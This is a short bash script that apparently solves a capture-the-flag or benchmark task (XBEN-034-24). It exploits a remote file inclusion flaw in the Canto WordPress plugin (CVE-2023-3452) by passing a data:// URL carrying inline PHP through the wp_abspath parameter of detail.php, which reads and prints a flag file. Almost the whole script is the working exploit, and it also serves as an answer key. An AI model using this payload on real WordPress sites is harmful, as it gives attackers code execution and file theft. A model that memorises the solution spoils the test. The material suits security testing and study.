#!/usr/bin/env bash
# XBEN-034-24 — RFI in the Canto WordPress plugin (CVE-2023-3452). Proxy-mode
# twin. detail.php includes wp_abspath with no restriction; a PHP data:// URL
# needs no external server — it carries the code inline to read and print the
# flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/FLAG.txt}"
SESSION="xben034p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/wp-content/plugins/canto/includes/lib/detail.php' \
  --set "query.wp_abspath=data://text/plain,<?php readfile(\"$FILE\"); ?>" >/dev/null
print_flag
